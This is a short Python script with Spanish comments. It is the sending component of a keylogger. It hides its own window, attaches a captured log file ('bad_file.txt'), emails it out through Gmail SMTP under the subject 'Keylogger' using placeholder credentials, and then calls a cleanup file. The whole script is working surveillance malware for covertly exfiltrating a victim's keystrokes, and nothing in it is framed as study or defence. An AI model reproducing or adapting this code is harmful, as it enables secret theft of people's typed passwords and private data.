import smtplib
import mimetypes
import win32gui, win32con #importamos estos modulos para ocultar la ventana
#Importamos  los siguientes modulos
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
#		OCULTAMOS VENTANA 
The_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)


mensaje = MIMEMultipart()
mensaje['From'] = "correo_remitente"
mensaje['To'] = "correo_destinatario"
mensaje['Subject'] = "Keylogger"
ruta_archivo = 'bad_file.txt'
nombre_archivo = 'bad_file'
#--------------- Añadimos el archivo  ------------
archivo_adjunto = open(ruta_archivo, 'rb')


# -------------- Construimos -------------------
adjunto_MIME = MIMEBase('aplicaction', 'octet-stream')
adjunto_MIME.set_payload((archivo_adjunto).read())
#   CODIFICAMOS A BASE 64
encoders.encode_base64(adjunto_MIME)
# ------------ Agregamos una cabecera al objeto ------------
adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % nombre_archivo)
#  --- Y finalmente lo agregamos al mensaje ----
mensaje.attach(adjunto_MIME)



#  _____________  [Conexion al Servidor]  _______________

sesion = smtplib.SMTP('smtp.gmail.com', 587)

#   ---- Ciframos conexion
sesion.starttls()

#   ----------- INICIO DE SESION --------------

sesion.login('correo_remitente', 'contraseña')


#Convertirmos a texto
texto = mensaje.as_string()


# SEND MESSAGE
sesion.sendmail('correo_remitente', 'correo_destinatario', texto)

#Cerramos la conexion
sesion.quit()
os.system('limpiar_archivo.cpp')